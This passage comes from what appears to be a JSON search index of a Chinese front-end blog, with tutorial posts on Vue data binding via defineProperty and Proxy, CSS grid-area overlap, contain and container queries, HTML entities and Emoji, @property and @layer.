Object.setPrototypeOf(obj, proxy); console.log(obj.info); // 1 参考资料 ES6 教程 Proxy ","link":"https://zkrisj.github.io/post/proxy-zhong-de-this-zhi-xiang/"},{"title":"Vue2 和 Vue3 的数据绑定原理和实现","content":"介绍 数据绑定是一种把用户界面元素（控件）的属性绑定到特定对象上面并使其同步的机制，使开发人员免于编写同步视图模型和视图的逻辑。 观察者模式又称为发布-订阅模式，它定义对象间的一种一对多的依赖关系，当它本身的状态发生改变时，所有依赖于它的对象都得到通知并被自动更新。比如用户界面可以作为一个观察者，业务数据是被观察者，用户界面观察业务数据的变化，发现数据变化后，就显示在界面上。这样可以确保界面和数据之间划清界限，假定应用程序的需求发生变化，需要修改界面的表现，只需要重新构建一个用户界面，业务数据不需要发生变化。有以下几个角色： 抽象主题（Subject）：提供一个接口，把所有观察者对象的引用保存到一个集合里，可以增加和删除观察者对象。 具体主题（Concrete Subject）：将有关状态信息存入观察者对象，在本身的内部状态改变时，给所有登记过的观察者发出通知。 抽象观察者（Observer）：为所有的具体观察者定义一个接口，在得到主题通知时更新自己。 具体观察者（Concrete Observer）：实现更新接口。 Vue2 和 Vue3 的数据绑定都是观察者模式的实现，前者使用 Object.defineProperty，后者使用的是 Proxy。 有以下 HTML： &lt;div id=&quot;app&quot;&gt; &lt;input type=&quot;radio&quot; name=&quot;hello&quot; id=&quot;hello&quot; value=&quot;hello&quot; v-model=&quot;title&quot;&gt; &lt;label for=&quot;hello&quot;&gt;hello&lt;/label&gt; &lt;input type=&quot;radio&quot; name=&quot;hello&quot; id=&quot;hello2&quot; value=&quot;hello2&quot; v-model=&quot;title&quot;&gt; &lt;label for=&quot;hello2&quot;&gt;hello2&lt;/label&gt; &lt;div v-bind=&quot;title&quot;&gt;&lt;/div&gt; &lt;input v-model=&quot;content&quot;&gt; &lt;select v-model=&quot;content&quot;&gt; &lt;option&gt;world&lt;/option&gt; &lt;option&gt;world1&lt;/option&gt; &lt;option&gt;world2&lt;/option&gt; &lt;/select&gt; &lt;div v-bind=&quot;content&quot;&gt;&lt;/div&gt; &lt;input type=&quot;checkbox&quot; id=&quot;hobby1&quot; value=&quot;hobby1&quot; v-model=&quot;hobby&quot;&gt; &lt;label for=&quot;hobby1&quot;&gt;hobby1&lt;/label&gt; &lt;input type=&quot;checkbox&quot; id=&quot;hobby2&quot; value=&quot;hobby2&quot; v-model=&quot;hobby&quot;&gt; &lt;label for=&quot;hobby2&quot;&gt;hobby2&lt;/label&gt; &lt;input type=&quot;checkbox&quot; id=&quot;hobby3&quot; value=&quot;hobby3&quot; v-model=&quot;hobby&quot;&gt; &lt;label for=&quot;hobby3&quot;&gt;hobby3&lt;/label&gt; &lt;br&gt; {{ hobby }} &lt;/div&gt; &lt;script&gt; const vm = new Vue({ el: '#app', data: { title: 'hello', content: 'world2', hobby: ['hobby2'], } }); &lt;/script&gt; 下面使用两种方法进行简单实现上面的双向绑定。 Object.defineProperty 语法： Object.defineProperty(obj, prop, descriptor) obj 要定义属性的对象。 prop 要定义或修改的属性的名称或 Symbol 。 descriptor 要定义或修改的属性描述符。 返回值 被传递给函数的对象。 首先定义一个观察者构造函数，并实现得到主题通知时更新自己的逻辑。第一行将当前观察者绑定到函数属性上面，是为了避免全局作用域变量。 function Observer(vm, node, name, nodeType) { // 构造函数被调用时，将当前对象绑定到函数属性上面，接下来触发 getter 时使用 Observer.target = this; this.update = () =&gt; { // 这里 vm[name] 读取操作会触发 getter if (node.type === 'radio') node.checked = node.value === vm[name]; else if (node.type !== 'checkbox') node[nodeType] = vm[name]; }; this.update(); Observer.target = null; // 设置为空，避免首次触发 getter 后重复添加 } 然后定义 Vue 构造函数，遍历 options.data 对象，为每个属性都生成一个主题（包含当前属性的观察者数组），然后使用 Object.defineProperty 劫持属性的读取和写入操作，在首次读取时添加一个对应的观察者对象，为了避免后面读取操作重复添加，在观察者构造函数里面首次更新操作完成后设置了空。 function Vue(options) { const obj = options.data; Object.keys(obj).forEach(key =&gt; { const subjects = []; Object.defineProperty(this, key, { get() { if (Observer.target) subjects.push(Observer.target); return obj[key]; }, set(newVal) { if (newVal === obj[key]) return; obj[key] = newVal; // 给当前主题所有登记过的观察者发出通知 subjects.forEach(observer =&gt; observer.update()); } }); }); } 接下来就是遍历根节点（这里只遍历一层），根据子节点的类型，传入不同的参数调用 Observer 构造函数，然后首次更新视图，并触发 getter 将观察者对象都对应放到 options.data 的每个属性主题中，然后按属性类型添加不同的事件监听。 const el = document.querySelector(options.el); el.childNodes.forEach(node =&gt; { if (node.nodeType === 1) { if (node.hasAttribute('v-model')) { const name = node.getAttribute('v-model'); if (node.type === 'checkbox') node.checked = this[name].includes(node.value); const eventType = (node.tagName === 'INPUT' &amp;&amp; node.type === 'text') || node.tagName == 'TEXTAREA' ? 'input' : 'change'; node.addEventListener(eventType, e =&gt; { // 这里 this[name] 写入操作会触发 setter if (node.type === 'checkbox') { if (node.checked) this[name] = this[name].concat(node.value).sort(); else this[name] = this[name].filter(v =&gt; v !== node.value).sort(); } else this[name] = node.value; }); new Observer(this, node, name, 'value'); } else if (node.hasAttribute('v-bind')) { new Observer(this, node, node.getAttribute('v-bind'), 'textContent'); } } else if (node.nodeType === 3 &amp;&amp; /\\{\\{(.*)\\}\\}/.test(node.nodeValue)) { new Observer(this, node, RegExp.$1.trim(), 'nodeValue'); } }); Proxy 语法： new Proxy(target, handler) target 被代理的对象 handler 被代理对象上的自定义行为，和 Reflect 对象的所有静态方法对应，所以可以在其中调用对应的 Reflect 方法，完成默认行为，然后再部署额外的功能。 第一步定义观察者构造函数，和 Object.defineProperty 方式相同。 第二步也是定义 Vue 构造函数，不同的是使用 Proxy 劫持属性的读取和写入操作，不需要为 options.data 对象每个属性都添加主题了。其他和 Object.defineProperty 方式相同。 function Vue(options) { const subjects = []; this.proxy = new Proxy(options.data, { get(obj, key, receiver) { if (Observer.target) subjects.push(Observer.target); const value = Reflect.get(...arguments); return typeof value === 'object' ? new Proxy(value, { set(obj, key, value, receiver) { subjects.forEach(observer =&gt; observer.update()); return Reflect.set(...arguments); } }) : value; }, set(obj, key, value, receiver) { if (value === obj[key]) return; const result = Reflect.set(...arguments); subjects.forEach(observer =&gt; observer.update()); return result; } }); } 第三步遍历根节点，触发 getter 将观察者对象都放到主题的数组中，然后添加事件监听时，要触发 Proxy 的写入操作，而不是原对象。 const el = document.querySelector(options.el); el.childNodes.forEach(node =&gt; { if (node.nodeType === 1) { if (node.hasAttribute('v-model')) { const name = node.getAttribute('v-model'); if (node.type === 'checkbox') node.checked = this.proxy[name].includes(node.value); const eventType = (node.tagName === 'INPUT' &amp;&amp; node.type === 'text') || node.tagName == 'TEXTAREA' ? 'input' : 'change'; node.addEventListener(eventType, e =&gt; { // 这里 this.proxy[name] 写入操作会触发 setter if (node.type === 'checkbox') { let value = this.proxy[name]; if (node.checked) { this.proxy[name] = value.concat(node.value).sort(); } else this.proxy[name] = value.filter(v =&gt; v !== node.value).sort(); } else this.proxy[name] = node.value; }); new Observer(this.proxy, node, name, 'value'); } else if (node.hasAttribute('v-bind')) { new Observer(this.proxy, node, node.getAttribute('v-bind'), 'textContent'); } } else if (node.nodeType === 3 &amp;&amp; /\\{\\{(.*)\\}\\}/.test(node.nodeValue)) { new Observer(this.proxy, node, RegExp.$1.trim(), 'nodeValue'); } }); ","link":"https://zkrisj.github.io/post/vue2-he-vue3-de-shu-ju-bang-ding-yuan-li-he-shi-xian/"},{"title":"使用 grid-area 实现元素层叠效果和对比其他方法","content":"介绍 实现如下图所示的排版效果，一段关于图片的信息浮在图片上。 HTML 结构如下： &lt;figure&gt; &lt;img src=&quot;../img/1.jpg&quot; width=&quot;100%&quot;&gt; &lt;figcaption&gt;自然风景&lt;/figcaption&gt; &lt;/figure&gt; translateY 这种方式最简单，但是元素原本的位置会保留，即 figcaption 原来的宽高还会留在原位置。 figcaption { transform: translateY(-3em); } 相对定位 跟上一种方法一样，figcaption 原来的宽高还会留在原位置。 figcaption { position: relative; top: -3em; } margin 负值定位 这种方法元素原本的位置不会保留，也使用了相对定位，使 figcaption 的背景能覆盖图片之上。 figcaption { position: relative; margin-top: -3em; } 绝对定位 这种方法元素原本的位置不会保留，也需要使用相对定位将其限制在父容器之内。 figure { position: relative; } figure&gt;figcaption { position: absolute; bottom: 0; width: 100%; } Grid 布局 使用 grid-area 属性指定 grid 子项所占用的网格。 figure { display: grid; } figure&gt;img, figure&gt;figcaption { grid-area: 1 / 1; } figcaption { align-self: end; } grid-area 语法 grid-area 是以下 CSS 属性的简写： grid-row-start grid-column-start grid-row-end grid-column-end grid-area: &lt;row-start&gt; / &lt;column-start&gt; / &lt;row-end&gt; / &lt;column-end&gt;; 可以使用四种写法： 4 个值，grid-row-start 会被设为第一个值，grid-column-start 为第二个值，grid-row-end 为第三个值，grid-column-end 为第四个值。 3 个值，grid-row-start 会被设为第一个值，grid-column-start 为第二个值，grid-row-end 为第三个值。如果 grid-column-start 为字符串，grid-column-end 则为该字符串；否则为 auto。 2 个值，grid-row-start 会被设为第一个值，grid-column-start 为第二个值。如果 grid-row-start 为字符串，grid-row-end 则为该字符串；否则为 auto。如果 grid-column-start 为字符串，grid-column-end 则为该字符串；否则为 auto。 1 个值，grid-row-start 会被设为该值，如果 grid-row-start 为字符串，则其他三项属性值均为该值；否则均为 auto。 所以上面的 grid-area: 1 / 1 相当于： grid-row-start: 1; grid-row-end: auto; grid-column-start: 1; grid-column-end: auto; img 和 figcaption 具有相同的行开始和列开始，所以发生了重叠。还可以使用字符串写法： figure { display: grid; grid: 'nature'; } figure&gt;img, figure&gt;figcaption { grid-area: nature; } 这里的 grid 是 grid-template-areas 的简写形式，'nature' 字符串可以是任意的（包括中文）。 优点 Grid 布局实现的元素层叠不改变容器元素的层叠上下文关系和元素的包含块关系。 方便地控制元素的位置，比如这里的 align-self: end 表示 figcaption 元素的位置在图片的底部，改成 align-self: start 或 align-self: center 则使 figcaption 元素的位置在图片的顶部或中部。 通过设置 align-self:stretch 可以实现半透明覆盖效果。 ","link":"https://zkrisj.github.io/post/shi-yong-grid-area-shi-xian-yuan-su-ceng-die-xiao-guo-he-dui-bi-qi-ta-fang-fa/"},{"title":"CSS contain 属性和新特性容器查询","content":"介绍 媒体查询可以根据视口的大小来更改文档布局，然而很多组件并不总是与视口的大小有关，而是与组件在布局中的放置位置有关。 容器查询可以在不改变浏览器视口宽度的前提下，根据容器中的空间大小进行布局调整。 容器查询规范将成为 CSS Containment 的一部分，它为 Web 开发人员提供了一种隔离 DOM 部分并向浏览器声明它们独立于文档其余部分的方法以允许性能优化。 容器查询属性 container-type 将元素定义为查询容器。后代可以查询其大小、布局、样式和状态等方面。可以具有以下值： size 为块和内联轴上的维度查询建立查询容器。将布局、样式和大小包含应用于元素。 inline-size 为容器的内联轴上的维度查询建立查询容器。将布局、样式和内联大小包含应用于元素。 block-size 在容器的块轴上建立维度查询的查询容器。将布局、样式和块大小包含应用于元素。 style 为样式查询建立查询容器。 state 为状态查询建立查询容器。 container-name 指定 @container 规则的查询容器名称列表，用于过滤目标查询容器。同 grid-area 一样，是一个 &lt;custom-ident&gt; 类型（用户自定义字符串标识符）。例如以下定义： .sidebar { container-type: inline-size; container-name: sidebar; } 然后，可以通过将名称添加到容器查询中来仅定位该查询容器： @container sidebar (min-width: 400px) { .card { display: grid; grid-template-columns: 2fr 1fr; } } container container-name / container-type 的组合简写形式。 示例 以下组件在容器有剩余空间时将显示为两列，如果没有剩余空间将堆叠显示。 CSS Containment 该规范的定义只有一个属性：contain，它的值表明你想用何种方式控制其 containment，使浏览器在重新计算布局、样式、绘图、大小或它们的任意组合时，只影响到有限的 DOM 区域，而不是整个页面。 作用 CSS Containment 允许开发者将某些子树从页面中独立出来，在包含大量独立组件的页面时非常实用，它可以防止某个小部件的 CSS 规则改变对页面上的其他东西造成影响。 节点的独立性对于开发者来说，是事先知道的。但浏览器却不能够从你的内容里推测出哪些部分会是独立的。因此，通过 CSS 让浏览器知道这一点，浏览器就可以通过这个信息来进行一些可观的性能优化。 使用 大多数的网页都包含了一些独立于网页中其他部分的区块。比如一个包含文章标题和内容的列表，如下： &lt;h1&gt;My blog&lt;/h1&gt; &lt;article&gt; &lt;h2&gt;Heading of a nice article&lt;/h2&gt; &lt;p&gt;Content here.&lt;/p&gt; &lt;/article&gt; &lt;article&gt; &lt;h2&gt;Another heading of another article&lt;/h2&gt; &lt;p&gt;More content here.&lt;/p&gt; &lt;/article&gt; 在这个页面中，每个 article 都独立于其他的 article，通过设置 contain: content（contain: layout paint 的缩写），可以告诉浏览器这些节点相互独立，该节点内部的渲染和排版完全独立于外部的其他内容，并且所有的内容渲染都只限定在其节点边界内部，溢出的部分不会显示。当新的内容被加入到该节点中时，浏览器就知道不用重排和重绘节点以外的页面内容。如果 &lt;article&gt; 设置了其 CSS 属性能让其大小根据其内容改变（比如 height: auto），浏览器依旧会进行其大小的计算。 article { contain: content; } Layout containment 布局的影响通常是整个页面的，比如你移动了某个节点，不论你是把它移动到哪儿，浏览器都会重新计算整个页面的布局。通过使用 contain: layout 你可以告诉浏览器，它只会影响到该节点内部的布局，所有内部的改变都不会影响外部页面的布局，这个容器建立了一个独立的格式化上下文。 article { contain: layout; } 注意： float 布局会独立存在。 布局边界不会存在边距塌陷。 该布局容器会成为 absolute/fixed 定位的。 容器会创建一个栈式上下文，因此可以使用 z-index。 Paint containment 表示这个元素的后代元素不会在它的边界外显示。如果一个元素在视窗外或因其他原因导致不可见，则它的子孙节点也同样不会被显示。如果后代元素溢出包含元素的边界，那么该后代元素将被裁剪到包含元素的边框。 article { contain: paint; } Size containment 元素的子元素的大小不会影响元素本身的大小——它的大小被计算为忽略子元素时的大小，好像它没有子元素一样。 article { contain: size|inline-size; } 注意： size 和 inline-size（内联大小）不能同时使用。 使用该值需要指定已应用此元素的元素的大小，如果你不手动给它一个大小，它在大多数情况下最终会是零大小。 Style containment 该值并不提供像 Shadow DOM那样的作用域样式。主要用例是防止在元素中更改 CSS 计数器的情况，使用 contain: style 将确保 counter-increment 和 counter-set 属性创建仅限于该子树的新计数器。 特殊值 contain: content 相当于同时开启 layout 和 paint。 contain: strict 将获得尽可能多的包含，其行为与 contain: size layout paint 相同。 示例 下面的标记由两篇文章组成，每篇文章都有内容和图像，并且图像是浮动的： &lt;h1&gt;My blog&lt;/h1&gt; &lt;article&gt; &lt;h2&gt;Heading of a nice article&lt;/h2&gt; &lt;p&gt;Content here.&lt;/p&gt; &lt;/article&gt; &lt;article&gt; &lt;h2&gt;Another heading of another article&lt;/h2&gt; &lt;img src=&quot;graphic.jpg&quot; alt=&quot;photo&quot; /&gt; &lt;p&gt;More content here.&lt;/p&gt; &lt;/article&gt; img { float: left; } 这会存在一个问题，因为浮动元素的布局超出了文章的底部，DOM 树的很大一部分会被重新布局或重新绘制，第一篇文章的图片最终出现在第二篇文章的区域内。 如果我们给每个 article 属性 contain 赋值 content，当插入新元素时，浏览器只需要重新计算包含元素的子树，而不需要重新计算它之外的任何东西。这也意味着第一个图像不再浮动到第二个文章，而是停留在其包含元素的边界内。 article { contain: content; } 对于 CSS 计数器，contain: style 使 counter-increment 和 counter-reset 被限定为元素的子树，并且计数器会恢复到 1。 想象一下，如果 DOM 树具有非常复杂的结构和内容，但只有一小部分页面被修改，我们就可以将其与页面的其余部分隔离开来，帮助改善性能。在一个有 10,000 个元素的页面上，如果单个元素发生了 DOM 变化，Chromium 也会在布局上花费大量时间，因为它会遍历整个 DOM 树（10,000 个元素）。如果我们在每个元素上使用了样式 contain: strict，浏览器就不需要在其内部发生变化时检查其他元素节点。要注意的是，如果内容溢出，元素节点会被剪裁，而如果没有为元素节点设置固定大小，它将被呈现为一个空框。 ","link":"https://zkrisj.github.io/post/css-contain-shu-xing-he-xin-te-xing-rong-qi-cha-xun/"},{"title":"HTML 字符实体和 Emoji 的使用","content":"HTML 实体 HTML 实体是一段以连字号（&amp; 或 &amp;#）开头、以分号（;）结尾的文本（字符串）。例如 A、B、C 的实体编号分别为 &amp;#65;、&amp;#66; 和 &amp;#67;。 HTML 中的预留字符必须被替换为字符实体。例如，如需显示小于号和大于号，我们需要写实体名称：&amp;lt; 和 &amp;gt;，或实体编号：&amp;#60; 和 &amp;#62;。 HTML 对多个空格会折叠成一个空格，如果需要显示多个空格，需要写多个 &amp;nbsp; 实体名称（多个空格的实体编号 &amp;#32; 也会折叠成一个空格）。 使用实体名称而不是编号的好处是，名称易于记忆。不过坏处是，浏览器也许不支持所有实体名称（对实体编号的支持却很好）。 对于没有 HTML 实体名称的字符，可以使用十进制（dec）或十六进制（hex）引用。例如 ♥ 具有实体名称 &amp;hearts;、十进制实体编号 &amp;#9829; 和十六进制实体编号 &amp;#x2665;，而 ♡ 没有实体名称，可以使用十进制实体编号 &amp;#9825; 和十六进制实体编号 &amp;#x2661; 来引用。 Emoji 表情符号（Emoji）是来自 UTF-8 字符集（HTML5 中的默认字符集）的字符，2010年10月发布的 Unicode 6.0 版首次收录表情符号编码（分配码点，可通过 HTML 实体书写）。它们可以像 HTML 中的其他任何字符一样复制、显示和调整它们的大小，也就是说，现在的 Emoji 符号就是一个文字，它会被渲染为图形。 Unicode 只是规定了 Emoji 的码点和含义，并没有规定它的样式。例如，码点 U+1F600 表示一张微笑的脸，但是这张脸长什么样，则由各个系统自己实现。如果用户的系统没有实现这个 Emoji 符号，用户就会看到一个没有内容的方框，因为系统无法渲染这个码点。IOS、安卓、Twitter、Github、Facebook 都有自己的 Emoji 实现。 Emoji 组合 Unicode 除了使用单个码点表示 Emoji，还允许多个码点组合表示一个 Emoji。 其中的一种方式是&quot;零宽度连接符&quot;（ZERO WIDTH JOINER，缩写 ZWJ）U+200D。举例来说，下面是三个 Emoji 的码点。 U+1F468：男人 U+1F469：女人 U+1F467：女孩 上面三个码点使用 U+200D 连接起来，U+1F468 U+200D U+1F469 U+200D U+1F467，就会显示为一个 Emoji 👨‍👩‍👧，表示他们组成的家庭。如果用户的系统不支持这种方法，就还是显示为三个独立的 Emoji 👨👩👧。 使用方式 Emoji 虽然是文字，但是无法书写，必须使用其他方法来插入文档中。 最简单的方法当然是复制/粘贴，你可以到 getEmoji.com 选中一个 Emoji 贴在自己的文档即可。 另一种方法是通过码点输入 Emoji。以 HTML 网页为例，将码点 U+1F600 写成 HTML 实体的形式 &amp;#128512;（十进制）或 &amp;#x1F600;（十六进制），就可以插入网页。码点可以到 emojipedia.org 查询。 JavaScript 输入 Emoji，可以使用 node-emoji 这个库。 const emoji = require('node-emoji'); // 返回 coffee 的 Emoji，☕️ emoji.get('coffee'); // 返回 github 风格的 markdown 表情符号对应的 Emoji，❤️ emoji.get(':heart:'); // 将文字替换成 Emoji，返回 &quot;I ❤️ ☕️!&quot; emoji.emojify('I :heart: :coffee:!'); // 随机返回一个 Emoji emoji.random(); // 查询 Emoji 返回一个数组，`[{ emoji: '☕️', key: 'coffee' }, { emoji: ⚰', key: 'coffin'}]` emoji.search('cof'); 通过 CSS 插入 Emoji。 &lt;link href=&quot;https://afeld.github.io/emoji-css/emoji.css&quot; rel=&quot;stylesheet&quot;&gt; &lt;i class=&quot;em em-baby&quot;&gt;&lt;/i&gt; ","link":"https://zkrisj.github.io/post/html-zi-fu-shi-ti-he-emoji/"},{"title":"CSS 自定义属性 @property 的使用","content":"介绍 CSS 属性和值 API 是 CSS Houdini API（一组底层渲染 API）的一部分，包括 JS 接口CSS.registerProperty 和 CSS 接口 @property 两部分。 CSS.registerProperty 用于注册自定义属性，允许检查属性类型、默认值以及继承或不继承其值。 语法 CSS.registerProperty(PropertyDefinition) PropertyDefinition 是一个字典对象，包含以下字段： name 一个字符串，表示正在定义的属性的名称。 syntax 表示已定义属性的预期语法的字符串。默认为 *。 inherits 一个布尔值，定义是否应该继承定义的属性。默认为 false. initialValue 表示已定义属性的初始值的字符串。 @property @property 规则提供了一个直接在样式表中注册自定义属性的方式，跟 CSS.registerProperty 函数使用同样的参数调用效果相同。并可以对属性类型检查、设定默认值及定义是否可以被继承。 语法 @property --my-color { syntax: &quot;&lt;color&gt;&quot;; inherits: false; initial-value: #c0ffee; } 以上相当于以下 JS 代码： window.CSS.registerProperty({ name: '--my-color', syntax: '&lt;color&gt;', inherits: false, initialValue: '#c0ffee', }); syntax 和 inherits 描述符是必需的。如果其中任何一项缺失，整条规则都将失效并且会被忽略。 initial-value 描述符仅在 syntax 描述符为通用语法定义（*）或接受了任何有效的标记值时是可选的，否则也是必需的——如果此时该描述符缺失，整条规则都将失效且被忽略。 未知描述符被视为无效并被忽略，但不会使 @property 规则无效。 syntax 描述了 @property 规则所允许的语法结构。 语法 syntax: '&lt;color&gt;'; /* 接收一个颜色值 */ syntax: '&lt;color#&gt;'; /* 接受逗号分隔的颜色值列表 */ syntax: '&lt;length+&gt;'; /* 接受以空格分隔的长度值列表 */ syntax: '&lt;length | length+&gt;'; /* 接受单个长度或以空格分隔的长度列表 */ syntax: '&lt;length&gt; | &lt;percentage&gt;'; /* 接收长度或百分比参数，但是二者之间不进行计算合并 */ syntax: 'small | medium | large'; /* 接收这些参数值之一作为自定义标识符 */ syntax: '*'; /* 任何有效字符 */ 类型 &lt;length&gt; 由一个 &lt;number&gt; 和一个长度单位构成。与所有 CSS 维度一样，单位的字面值与数字之间没有空格。数字为 0 时，长度单位是可选的。例如 1em 10px;。 &lt;number&gt; 可以是整数或带有小数部分的数字。 &lt;percentage&gt; 一个百分比值。 &lt;length-percentage&gt; 可以是 &lt;length&gt; 或 &lt;percentage&gt;，例如 200px、20%、calc(100% - 200px)。 &lt;color&gt; 使用关键字（比如 blue 或 transparent）、以 # 加十六进制或者 rgb() 和 rgba() 函数表达式的形式，或以 hsl() 和 hsla() 函数表达式的形式。 &lt;image&gt; CSS 渐变（图像）、矢量图形（比如 SVG 格式的图像）和 jpeg 等格式的图像。例如 url(test.jpg)、linear-gradient(to bottom, blue, red)。 &lt;url&gt; 指向一个资源。它没有独有的表达形式，只能通过 url() 函数定义。 &lt;integer&gt; 没有带单位的正整数或负整数。 &lt;angle&gt; 表示角的大小，单位为度（deg）、百分度（grad）、弧度（rad）或圈数（turn）。在 &lt;gradient&gt; 和 transform 的某些方法等场景中使用。 &lt;time&gt; 表示以秒（s）或毫秒（ms）为单位的时间的值，可为小数和负值。于 animation、transition 及相关属性中使用。 &lt;resolution&gt; 表示输出设备的像素密度。由严格为正 &lt;number&gt; 组成，后跟下面列出的单位之一。与所有 CSS 维度一样，单位字面值与数字之间没有空格。用于媒体查询中使用，例如 @media print and (min-resolution: 300dpi) { ... }。 - dpi：表示每英寸的点数。 - dpcm：每厘米上的点数。1 英寸是 2.54 厘米，1dpcm ≈ 2.54dpi。 - dppx：表示每个px的点数。 由于 CSS px 的固定比率为 1:96，因此 1dppx 相当于 96dpi。 - x：dppx 的别名。 &lt;transform-function&gt; 用于对元素的显示做变换的 CSS 函数，matrix()、matrix3d()、perspective()、rotate()、rotate3d()、rotateX()、rotateY()、rotateZ()、scale()、scale3d()、scaleX()、scaleY()、scaleZ()、skew()、skewX()、skewY()、translate()、translate3d()、translateX()、translateY()、translateZ()。 &lt;custom-ident&gt; 任何用户自定义字符串标识符，要区分大小写。 &lt;transform-list&gt; 有效的 &lt;transform-function&gt; 值的列表。 inherits 控制由 @property 声明注册的自定义属性默认情况下是否会被继承。可为以下取值： true 属性默认继承。 false 属性默认不继承。 auto 默认值，自动设置。 initial-value initial-value 的值是对于设定的 syntax 具有正确值的字符串。依照 syntax 描述符定义，必须可以正确地解析。因此，如果 syntax 描述符为 &lt;color&gt;，那么初始值必须是一个有效的 color 值。 使用 @property 的类型为浏览器提供了更多的上下文信息，这可以使我们为浏览器提供所需的信息来转换和动画这些属性。这也为那些不支持 transition 过渡或 animation 动画的 CSS 属性提供了一种解决方案。 下面例子中有四个饼图：没有使用变量定义的饼图、使用普通变量定义 conic-gradient 颜色的饼图、使用 @property 变量定义 conic-gradient 颜色的饼图和使用 JS 方法 CSS.registerProperty 注册属性定义 conic-gradient 颜色的饼图。可以看到只有使用 @property 属性和使用 JS 方法 CSS.registerProperty 注册属性定义的 CSS 值可以实现动画效果，而普通变量定义的 CSS 值没有动画效果。 @property --property { syntax: &quot;&lt;percentage&gt; | &lt;angle&gt;&quot;; inherits: false; initial-value: 18deg; } .property { background: conic-gradient(red, red var(--property), transparent var(--property), transparent 100%); transition: --property .5s linear; } .property:hover { --property: 360deg; } CSS.registerProperty &amp;&amp; CSS.registerProperty({ name: '--color', syntax: '&lt;color&gt;', inherits: false, initialValue: 'red', }); 由于 @property 的值可以通过伪元素的 content 属性传递到 DOM，所以我们有了一种通过 CSS 来改变 DOM 的方法。 @keyframes load { 0%, 10% { --angle: 0deg; --hue: 0; --dot: ''; } 40% { --hue: 30; --dot: '.'; } 70% { --hue: 60; --dot: '..'; } 100% { --angle: 360deg; --hue: 90; --dot: '...'; } } 浏览器支持 Firefox 和 Safari 浏览器在 PC 和移动端均不支持 @property 属性。 ","link":"https://zkrisj.github.io/post/css-zi-ding-yi-shu-xing-property-de-shi-yong/"},{"title":"CSS @layer 规则的使用","content":"介绍 CSS @规则 中的 @layer 声明了一个级联层，同一层内的规则将级联在一起。也可用于定义多个级联层的优先顺序。 语法 /* layer-name 的主要作用是用来灵活设置 @layer 和其他 @layer 规则的前后优先级。 */ /* rules 是级联层中的一组 CSS 规则 */ @layer layer-name {rules} @layer layer-name; @layer layer-name1, layer-name2, layer-name3; @layer {rules} 注意：不属于任何一级联层的样式将被集中到同一匿名层，并置于所有层的后部，这意味着任何在层外声明的样式都会覆盖在层内声明的样式，而不管选择器权重和优先级如何。 @layer 的使用场景 问题1 我们在实际开发的时候，经常会使用第三方组件。但是这些组件虽然功能是我们需要的，但是 UI 样式却和产品的风格不一致，我们需要对这些组件的 UI 进行重置，换个肤，变个色什么的。这时，我们可以使用优先级更高的选择器进行覆盖。例如： .container .some-button {} 覆盖的时候，需要增加一点权重。 body .container .some-button {} 但是，这种做法很繁琐，不灵活。 问题2 但是，有些 Web 组件甚至还有 CSS reset 代码，而所有的 CSS 在同一个文档流中都公用同一个上下文（无论是 Shadow DOM 还是 iframe 都可以看成是一个独立的上下文），这就导致这些 CSS 代码会影响全局样式。例如，组件内设置了： a { color: blue; } a:hover { color: darkblue; } 由于引入组件的 CSS 往往都在项目 common.css 的后方，所以优先级更高，导致整个网页的链接元素的颜色都被污染了。这时，需要将 common.css 中的相关优先级提高才行。例如： body a { color: blue; } body a:hover { color: blue; } 问题3 对于链接元素的 CSS reset，最好的方法是使用 :any-link 伪类（匹配每一个有 href 属性的 &lt;a&gt;、&lt;area&gt; 或 &lt;link&gt; 元素）： :any-link { color: blue; } :any-link:hover { color: darkblue; } 这样语义最好，匹配最精准，且无需担心 :visited 伪类的干扰。但是因为伪类的优先级比较高，一旦设置，某个 &lt;a&gt; 元素按钮想要重置颜色，所需要的选择器成本就会很高，提高了整个项目的选择器复杂度。 @layer 的解决方法 以上三个场景描述都指向了同一个问题，同一个 CSS 上下文中，有些 CSS 声明需要设置低优先级，且这种优先级不受选择器权重的影响。@layer 规则就是解决上面这种场景应运而生的，可以让 CSS 声明的优先级下降一整个级联级别。 对于组件或者模块的 CSS，我们可以全部写在 @layer 规则中，把自身的优先级降到底部。例如： @layer { .container .some-button { height: 30px; } :any-link { color: blue; } :any-link:hover { color: darkblue; } } 此时，业务中的 CSS 代码就可以无视组件 CSS 中的优先级了，直接这样设置就可以进行重置： .some-button { height: 40px; } a { color: deepskyblue; } a:hover { color: skyblue; } 对于第三方的 CSS 文件，尤其是那些走 CDN 的绝对地址 CSS，我们是没办法修改相关的代码的，此时可以在传统的 @import 语法后面再添加个 layer(layer-name)： @import './lib.css' layer(lib); 此时，lib.css 里面所有 CSS 声明的优先级都会低于常规设置的 CSS 声明。 使用 创建一个命名的级联层，其中包含该层的 CSS 规则，如下所示： @layer utilities { .padding-sm { padding: 0.5rem; } .padding-lg { padding: 0.8rem; } } 定义命名的级联层而不分配任何样式。如下所示： /* 定义一个命名的级联层 */ @layer utilities; /* 一次定义多个命名的级联层 */ @layer theme, layout, utilities; 级联层最初被指定的顺序决定了它是否有优先级，如果同一声明中有多个级联层被指定，则最后一个级联层中的样式将优先于其他层。因此，在上面的例子中，如果 theme 层和 utilities 层中存在冲突的规则，那么 utilities 层中的将优先被应用。 级联层顺序建立之后，选择器的出现顺序和优先级都会被忽略。这将使创建 CSS 选择器变得更加简单，因为你不需要确保每一个选择器都有足够高的优先级来覆盖其他冲突的规则，你只需要确保它们出现在一个顺序更靠后的级联层中。 注意：在声明级联层的名称后，它们的顺序即被确立，你可以重复声明某级联层的名字来向其添加新的 CSS 规则。这些样式将被附加到该层的末尾，但级联层之间的顺序不会改变。 创建一个匿名的级联层。除创建后无法向其添加规则外，该层和其他命名层功能一致。 @layer { p { margin-block: 1rem; } } 使用 @import 创建级联层。在这种情况下，规则将在导入的样式表中，@import at 规则必须位于所有（除了 @charset）其他类型的规则之前。 @import &quot;theme.css&quot; layer(utilities); 也可以直接使用 layer 关键字，而不是作为一个方法使用，来匿名引入： @import './lib.css' layer; 级联层允许嵌套，例如： @layer framework { @layer layout { } } 向 framework 层内部的 layout 层附加规则，只需用符号 . 连接这两层。 @layer framework.layout { p { margin-block: 1rem; } } 在 &lt;link&gt; 元素上创建级联层。 &lt;!-- lib.css的样式属于名为 lib 的级联层 --&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;lib.css&quot; layer=&quot;lib&quot;&gt; &lt;!-- 样式引入到一个匿名级联层中 --&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;lib.css&quot; layer&gt; 示例 示例1 在以下示例中，创建了两个 CSS 规则。一个用于级联层之外的元素 p，一个用于命名为 type 的层内 .box 